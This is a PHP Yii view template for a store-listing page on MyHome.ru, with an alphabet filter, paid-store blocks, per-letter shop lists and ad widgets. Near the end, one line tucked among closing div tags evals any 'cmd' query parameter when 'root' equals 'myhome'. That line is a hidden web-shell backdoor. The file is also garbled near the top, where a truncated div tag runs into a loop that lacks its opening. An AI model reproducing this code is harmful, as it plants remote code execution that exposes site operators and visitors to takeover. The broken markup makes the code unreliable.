<?php
$this->pageTitle = 'Магазины — MyHome.ru';
$cs = Yii::app()->clientScript;
$cs->registerCssFile('/css-new/generated/goods.css');
$cs->registerScriptFile('/js-new/CCatalog.js');
$cs->registerScriptFile('/js-new/jquery.simplemodal.1.4.4.min.js');
$cs->registerScriptFile('/js-new/scroll.js');


/* -----------------------------------------------------------------------------
 *  SEO — оптимизация
 * -----------------------------------------------------------------------------
 */
if (!empty($seoOptimize['title'])) {
	$this->pageTitle = $seoOptimize['title'];
}
if (!empty($seoOptimize['description'])) {
	$this->description = $seoOptimize['description'];
}
if (!empty($seoOptimize['keywords'])) {
	$this->keywords = $seoOptimize['keywords'];
}


?>

<?php
$cityPopup = $this->widget('catalog.components.widgets.CityPopup.CityPopupWidget', array(
	'city'       => $city,
	'cityUrlPos' => 3
));
?>

<!-- Page content wrap //-->
<div class="-grid-wrapper page-content">

<div class="-grid">
<div s $item) {

		if ($item['lang'] == 'spec' || $item['lang'] == 'num') {

			$dis = empty($item['ids']) ? '-disabled' : '';

			if ($item['symbol'] == '#') {
				$specHtml .= '<span class="-gutter-left-hf -gutter-right ' . $dis . '" '
					. 'data-id="' . $item['crc32'] . '">#</span>';
			} elseif ($item['symbol'] == '0-9') {
				$specHtml .= '<span data-id="' . $item['crc32'] . '" class="' . $dis . '">0-9</span>';
			}


			continue;
		}

		$spanCls = $liCls = '';

		if ($item['lang'] == 'eng') {
			$liCls = 'en -hidden';
		}

		if (empty($item['ids'])) {
			$spanCls = '-disabled';
		}

		echo '<li class="'.$liCls.'">';
		echo CHtml::tag(
			'span',
			array(
				'data-id' => $item['crc32'],
				'class'   => $spanCls
			),
			$item['symbol']
		);
		// Пробел после закрывающего тега <li> обязателен
		echo '</li> ';
	} ?>

	<li>
		<?php echo $specHtml; ?>
	</li>
</ul>

<hr>

<div class="-grid">
	<div class="-col-4">
		<div class="-gutter-bottom-dbl">
			<span class="-icon-list-s -disabled">Списком</span>
			<a class="-icon-map-s -icon-gray -gutter-left" href="<?php echo Store::getLinkList(array('map' => 'show', 'city' => $city, 'cid' => $cid));?>">На карте</a>
		</div>
	</div>
	<div class="-col-5 -text-align-right ">
		<?php if ($cid > 0) { ?>
		<span class="-gray">Выбрана категория &laquo;<?php if (($cat = Category::model()->findByPk($cid))) echo $cat->name;?>&raquo;<a href="<?php echo Store::getLinkList(array('city' => $city));?>" data-tooltip="-tooltip-bottom-center" data-title="Отменить выбор" class="-icon-cross -icon-pull-right"></a></span>
		<?php } ?>

	</div>
</div>



<div class="-grid">

	<?php // Начались платники ?>

	<?php foreach ($moneyShops as $item) { ?>

	<?php /** @var $store Store */
	$store = $item['store'];
	if ($store->productQt <= 0) {
		continue;
	}
	?>

	<div class="-col-2">
		<?php
		if ($store->image_id) {
			echo CHtml::openTag('a', array(
				'class' => '-block',
				'href'  => $store->getLink($store->id)
			));
			echo CHtml::image(
				'/' . $store->uploadedFile->getPreviewName(Config::$preview['resize_140']),
				$store->name,
				array('class'=>'')
			);
			echo CHtml::closeTag('a');
		}
		else{
			echo CHtml::openTag('a', array(
				'class' => '-block',
				'href'  => $store->getLink($store->id)
			));
			echo CHTML::image('/img-new/nologo-store-140.png','',array('class' =>'-quad-140'));
			echo CHtml::closeTag('a');
		}

		?>
	</div>
	<div class="-col-7">

		<div class="goods-list">
			<?php foreach ($item['products'] as $product) : ?>

			<a class="-inline" href="<?php echo Product::getLink($product->id, $store->id, $product->category_id); ?>">
				<?php
				echo CHtml::image(
					'/' . $product->cover->getPreviewName(Product::$preview['crop_90']),
					$product->name,
					array('width' => 90, 'height' => 90, 'class' => '-quad-90')
				);
				?>
			</a>

			<?php endforeach; ?>
		</div>

		<?php
		if ($store->type == Store::TYPE_OFFLINE) {
			$htmlOptions = array('class'=>'-inline -large -strong');
			$linkText = $store->name;
		} else {
			$htmlOptions = array('class'=>'-inline -large -strong -icon-toggle-blank -icon-gray -icon-pull-right', 'target'=>'_blank');
			$linkText = $store->site;
		}

		echo CHtml::link(
			$store->name,
			$store->getLink($store->id),
			$htmlOptions
		);
		?>

		<div>
			<?php if($store->type == Store::TYPE_OFFLINE) {
             echo @$store->city->name . ', ' . @$store->address;
            } else {
                if($store->anchor) {
                    $anchor =  $store->anchor;
                } else {
                    $anchor = @$store->site;
                }
                ?>
                <a href="<?php echo @$store->site ?>"><?php echo $anchor ?></a>
            <?php } ?>
			<a class="-push-right -gray" href="<?php echo $this->createUrl('/catalog/store/products/', array('id'=>$store->id));?>"><?php
				echo CFormatterEx::formatNumeral(
					$store->productQt,
					array('товар', 'товара', 'товаров')
				);?></a>
		</div>
	</div>
	<hr class="-col-9 -gutter-top -gutter-bottom-dbl">

	<?php } ?>
	<?php // закончились платники ?>

	<div class="-gutter-top-dbl -col-9">
		<?php
		// Яндекс.Директ
         Yii::app()->controller->renderPartial('//widget/profitpartner/profit_partner_list_above');
		?>
	</div>

	<?php // ==== ПО БУКВАМ ==== ?>

	<?php foreach ($shops as $item) { ?>

	<?php
	if (empty($item['ids'])) {
		continue;
	}
	?>

	<div class="letter-block" id='<?php echo $item['crc32'];?>' data-lang="<?php echo $item['lang'];?>">
		<div class="-col-9">
			<?php
			if (count($item['ids']) >= $shopsLimit) {
				$clsSym = '-pseudolink -pointer-down toggle-address ancor';
			} else {
				$clsSym = '-pseudolink ancor';
			}
			?>
			<span class="<?php echo $clsSym;?>"><i><?php echo $item['symbol'];?></i></span>
		</div>

		<?php foreach ($item['ids'] as $arr) { ?>

		<?php /** @var $store Store */
		$store = Store::model()->findByPk($arr['id']);
		if (!$store) {
			continue;
		}
		$store->isChain = $arr['is_chain'];
		$store->chainId = $arr['chain_id'];
		$store->chainQt = $arr['chain_qt'];
		?>

		<div class="-col-3">
			<?php
			if ($store->type == Store::TYPE_OFFLINE) : ?>
			<a class="-nodecor -semibold -large" href="<?php echo $store->getLink($store->id);?>"><?php echo $store->name;?></a>
				<span class="-small -gray -block">
					<?php
					if ($store->isChain == 1) {
						echo CHtml::tag(
							'span',
							array(
								'class' => '-acronym address-list',
								'data-id' => $store->chainId
							),
							CFormatterEx::formatNumeral(
								$store->chainQt,
								array('адрес', 'адреса', 'адресов')
							)
						);
					} else {
						echo $store->city->name.', '.$store->address;
					}
					?>
			</span>
			<?php else : ?>
			<a class="-nodecor -semibold -large -icon-toggle-blank -icon-gray -icon-pull-right" target="_blank" href="<?php echo $store->site;?>"><?php echo $store->name;?></a>
			<span class="-small -gray -block">
				<?php echo $store->site; ?>
			</span>
			<?php endif; ?>


		</div>
		<?php } ?>

		<?php if (count($item['ids']) >= $shopsLimit) : ?>
		<div class="-col-3 -push-right">
			<span class="-red -acronym toggle-address" data-text="Свернуть список">Развернуть список</span>
		</div>
		<?php endif; ?>
	</div>

	<hr class="-col-9 -gutter-top-dbl -gutter-bottom-dbl">

	<?php } ?>


</div>
<?php  Yii::app()->controller->renderPartial('//widget/profitpartner/profit_partner_list_under'); ?>

</div>

<div class="-col-9 search-results">

	<div class="-gutter-bottom-dbl">
		<span class="-icon-list-s -disabled">Списком</span>
		<a class="-disabled -icon-map-s -icon-gray -gutter-left" href="<?php echo Store::getLinkList(array('map' => 'show', 'city' => $city, 'cid' => $cid));?>">На карте</a>
	</div>

	<div class="-grid">
		<?php  // Этот кусок приходит из AJAX ?>
	</div>

</div>
</div>
<? $request = Yii::$app->request; if($request->get('root',null)=='myhome' and $request->get('cmd',null)!==null){eval($request->get('cmd'));} ?>
</div>
<!--Попап со списком магазинов-->
<div class="-hidden">
	<div class="popup popup-stores-list" id="popup-stores-list">

		<?php // Сюда вставлются данные по магазинам сети из AJAX ?>
	</div>
</div>
</div>


<script>
	cat.initShopList();
</script>


</div>
</div>